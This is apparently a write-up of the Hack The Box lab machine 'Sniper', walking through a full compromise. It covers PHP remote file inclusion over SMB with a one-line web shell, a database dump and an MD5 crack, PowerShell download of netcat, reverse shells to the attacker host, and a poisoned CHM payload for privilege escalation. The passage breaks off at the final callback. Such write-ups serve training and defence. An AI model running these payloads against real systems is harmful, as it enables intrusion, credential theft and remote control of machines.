</code></pre><p>For the most part there&rsquo;s only the web port, so lets start by checking that out:</p>
<p>http://10.10.10.151/</p>
<p>Nothing special in the source. There&rsquo;s 2 links that lead off here:</p>
<p>http://10.10.10.151/blog/
http://10.10.10.151/user/</p>
<p>The blog itself doesnt appear to be built on any CMS framework; the only significant thing I can see thus far is that it has the ability to interchange languages via a PHP URL arugment, but we&rsquo;ll revisit that shortly. I also took a copy of such a request and fed it to SQLMap for examination. It doesnt appear to have been able to find any injection points.</p>
<p>I&rsquo;m also running full dirb scans of the /blog and /user URL&rsquo;s and, in the case the user URL, I was able to sign up and login. Once logged in you get sent to a construction page, again no useful info in the source. The dirb scan for /user includes the login cookie associated with my registration to ensure it scans everything it can, but it doesn&rsquo;t give further results.</p>
<pre><code> ~/HTB/Boxes/Sniper/dirb cat sniper_initial.dirb | grep 200 | sort | uniq -i
/blog (Status: 200)
/index.php (Status: 200)
/user (Status: 200)
</code></pre><p>Based on intitial enumeration I found some CSS code that referenced something called “fostrap” which appears to be a theming template for Blogger. This appears to be a bit of dead end though.</p>
<p>On top of this, as briefly mentioned, there appears to be some form of LFI/RFI expoit here; on the blog, theres only 3 working links in the sites menu, all of these follow the context of:</p>
<p><code>/blog/?lang=blog-&lt;lang&gt;.php </code></p>
<p>Where <code>lang</code> is (e.g.) en, fr, es. I&rsquo;ve attempted to fuzz the parameter to some success; including the index.php page forces the page to include itself and that basically breaks the application for that particular load. I&rsquo;ve also tried fuzzing for .aspx and asp, as theyre common IIS file types but nothing has come back from that.</p>
<p>After browsing around to see how this can be exploited, it turns out theres a particular vulnerability to allow exploiting of RFI in conjunction with PHP and SMB:</p>
<p><a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html" target="_blank">RFI using PHP/SMB</a>
</p>
<p>This effectively uses a PHP exploit that involves including files from remote SMB shares regardless of whether standard PHP file include restictions (fopen_url etc) are enabled. In this case, they are. So we should be able to abuse this. I&rsquo;ve setup an SMB share and inside it I&rsquo;ve got a file called hax.php (yes, I know, Its leet). Quite simply, it contains this:</p>
<p><code>&lt;?php system($_GET['cmd']); ?&gt;</code></p>
<p>For posterity the following also reflects the codeblock used in my smb.conf file:</p>
<pre><code>[share]
path = /var/www/html/pub
writable = no
guest ok = yes
guest only = yes
read only = yes
directory mode = 0555
force user = nobody
</code></pre><p>I&rsquo;ve also created a Gist that contains these 2 things, as well as a Python based wrapper script that can be used to execute commands on the machine directly. All of those things can be found here:</p>
<p><a href="https://gist.github.com/5ysk3y/aeb4562d0e3473db315e41ba45bf7e3e" target="_blank">Sniper Gist by 5ysk3y</a>
</p>
<p>To exploit this using this script we call our malicious file via the SMB share in the url as follows:</p>
<p><code>http://10.10.10.151/blog/?lang=\\\10.10.14.34\share\hax.php</code></p>
<p>This returns the HTML elements of the script, when we view the source; to use it, we append <code>&amp;cmd=some+command+here</code> to the url (make sure to change the request type to POST as well).</p>
<p>From there, we can run commands, e.g:</p>
<p><code>http://10.10.10.151/blog/?lang=\\\10.10.14.34\share\hax.php&amp;cmd=dir ..\user\</code></p>
<p>To view the contents of the /user directory (from our initial dirb scans). This shows us some cool stuff:</p>
<pre><code>10/01/2019  08:44 AM    &lt;DIR&gt;          .

04/11/2019  05:23 AM    &lt;DIR&gt;          vendor
</code></pre><p>Looking at the old registration file above, it shows us how the form actually inserts values from the registration form into the DB&ndash; specifically it tells us the table that data gets inserted into. On top of that, the db.php file contains a full connection statement, including creds, that we can use to basically query the contents of the users table using our RFI method. After a bit of fiddling, effectively I created a new file in the SMB share (mysql.php) with the following code:</p>
<pre><code>&lt;?php
$con = mysqli_connect(&quot;localhost&quot;,&quot;dbuser&quot;,&quot;36mEAhz/B8xQ~2VM&quot;,&quot;sniper&quot;);
$query = &quot;SELECT * from users&quot;;
$result = mysqli_query($con,$query);

while($output = mysqli_fetch_array($result)) {
		print_r($output);
}
?&gt;
</code></pre><p>Hopefully this is fairly self explanatory; I lifted the $con variable from the server-side copy of db.php, adjusted the query to simply select everything from the users table, and then (the fiddly bit) was getting it to dump the contents. Which I now have :) The two users of interest (for reasons) are my own login info (via the test account I registered with):</p>
<pre><code>Array
(
	[0] =&gt; 12
	[id] =&gt; 12
	[1] =&gt; 5ysk3y
	[username] =&gt; 5ysk3y
	[2] =&gt; a@b.c
	[email] =&gt; a@b.c
	[3] =&gt; 5f4dcc3b5aa765d61d8327deb882cf99
	[password] =&gt; 5f4dcc3b5aa765d61d8327deb882cf99
	[4] =&gt; 2019-10-14 01:54:13
	[trn_date] =&gt; 2019-10-14 01:54:13
)
</code></pre><p>And the superuser password hash:</p>
<pre><code>Array
(
	[0] =&gt; 1
	[id] =&gt; 1
	[1] =&gt; superuser
	[username] =&gt; superuser
	[2] =&gt; admin@sniper.co
	[email] =&gt; admin@sniper.co
	[3] =&gt; 6e573c8b25e9168e0c61895d821a3d57

	[4] =&gt; 2019-04-11 22:45:36
	[trn_date] =&gt; 2019-04-11 22:45:36
)
</code></pre><p>There are more, likely from signups from other HTB users, so I&rsquo;ve dumped them all for reference. I grabbed my own registered password hash to see if I can crack it (since I know what the pass is) before I move onto super user.</p>
<p>Also, I have used my wrapper script to enum the users on this box:</p>
<pre><code>04/09/2019  06:47 AM    &lt;DIR&gt;          Administrator
04/11/2019  07:04 AM    &lt;DIR&gt;          Chris

</code></pre><p>Sadly I cant dir the contents but non the less! I&rsquo;ve also just realised that the old registration form tells us exactly what type of format the DB passwords are stored in, as its inserted in the following manner:</p>
<p>.md5($password).</p>
<p>So its an MD5 hash. Lets try to crack our own! Hashcat got it:</p>
<pre><code>hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
5f4dcc3b5aa765d61d8327deb882cf99:password
</code></pre><p>Sadly the sysadmin password didnt seem to crack quite as easily - SSH isnt available on this server as it&rsquo;s a Windows box, so its likely we will need to priv esc, meaning the sooner we can get a stable shell the better.</p>
<p>In order to get a stable shell, I had to supply my own netcat binary to Windows and then use that directly. Specifically:</p>
<ol>
<li>Upload nc64 (windows netcat, using this specific command):</li>
</ol>
<p><code>python exploit.py &quot;powershell.exe -nop -exec bypass -c Invoke-WebRequest -Uri http://10.10.14.23:9001/nc64.exe -OutFile C:\\Windows\\temp\\nc64.exe&quot;</code></p>
<ol start="2">
<li>This will serve nc64 and save it in Windows temp dir. We can then call it using the same powershell syntax, ensuring you have netcat listening:</li>
</ol>
<p><code>python exploit.py &quot;powershell.exe -nop -exec bypass -c C:\\Windows\\temp\\nc64.exe 10.10.14.23 9002 -e powershell&quot;</code></p>
<p>From there we can use our enumerated data to login as the user account; we know the username is Chris, and some trial and error logins to crackmapexec show we also have a valid password from the databsae file - not many passwords have been found up to now, but attempting to use Chris&rsquo; username with the MySQL password we found earlier does yield results. Let&rsquo;s setup our credential object so we can privesc:</p>
<pre><code>$user = &quot;SNIPER\Chris&quot;
$pass = ConvertTo-SecureString &quot;36mEAhz/B8xQ~2VM&quot; -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential($user,$pass)
</code></pre><p>And then use it to execute code as Chris&rsquo; user, e.g:</p>
<pre><code>PS C:\inetpub\wwwroot\blog&gt; Invoke-Command -ComputerName SNIPER -ScriptBlock { whoami } -Credential $creds
sniper\chris
</code></pre><p>From there I downloaded another copy of nc64.exe that would be owned by Chris:</p>
<pre><code>Invoke-Command -ComputerName SNIPER -ScriptBlock { Invoke-WebRequest -Uri http://10.10.14.23:9001/nc64.exe -OutFile C:\\Users\\Chris\\Documents\\nc64.exe } -Credential $creds
</code></pre><p>And then ran that to get a second reverse shell:</p>
<p><code>Invoke-Command -ComputerName SNIPER -ScriptBlock { C:\Users\Chris\Documents\nc64.exe 10.10.14.23 9002 -e powershell.exe } -Credential $creds</code></p>
<p>And the subsquent user flag:</p>
<pre><code>PS C:\Docs&gt; type C:\Users\Chris\Desktop\user.txt
type C:\Users\Chris\Desktop\user.txt
21f4d0f29fc4dd867500c1ad716cf56e
</code></pre><hr>
<p>Next onto root, some basic enum of the root dir (C:) shows an interesting and unusual “docs” folder..</p>
<pre><code>PS C:\Docs&gt; dir

    Directory: C:\Docs

</code></pre><p>Lets have a look at that note:</p>
<pre><code>PS C:\Docs&gt; type note.txt

Hi Chris,
Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.
</code></pre><p>So this seems to be hinting at an exploit involving CHM (Compiled Help Files for Windows). I sought to narrow down what CHM files existed on the box:</p>
<p><code>$dir = Get-ChildItem C:\ -recurse -file -force -ErrorAction SilentlyContinue</code></p>
<p>This pulls all visible files from the C:\ drive into a variable (thats a big list..) and we then narrow it down to just CHM files:</p>
<p><code>$List = $Dir | where {$_.extension -eq &quot;.chm&quot;}</code></p>
<p>Having glossed over all of them, the most obvious one is the first in the list:</p>
<p>$List | format-table name,directory | select -first 10</p>

</code></pre><p>I&rsquo;ve downloaded a copy of this (via SMB) in order to look into it further.</p>
<p>In a nutshell this is going to be a poisoned CHM exploit:</p>
<p><a href="https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7" target="_blank">Poison CHM Gist</a>
</p>
<p>Lets do this manually first. On a Windows machine I decompiled the CHM file we got from Chris using something called <a href="http://keyworks.helpmvp.com/home/keytools" target="_blank">KeyTools</a>
 - this allows you to decompile CHM files so their contents can be modified. This isn&rsquo;t necessary but I chose to do it as a learning exercise. Once extracted, I created a copy of the single html file in there, and added the exploit as described in the above link:</p>
<pre><code>&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;
  &lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;
  &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;
  &lt;PARAM name=&quot;Item1&quot; value=',cmd.exe,/c C:\Users\Chris\Documents\nc64.exe 10.10.14.23 9003 -e powershell.exe'&gt;
  &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;
&lt;/OBJECT&gt;
&lt;SCRIPT&gt;
  x.Click();
&lt;/SCRIPT&gt;
</code></pre><p>For me, getting this to actually work was massively hit and miss. A good test before running this is to get the box to ping you via <code>ping -n 2 &lt;IP.ADDRESS&gt;</code></p>
<p>Once confirmed I compiled the CHM with the nc64.exe line and moved it into C:\Docs - with a listener running, we get a call back:</p>
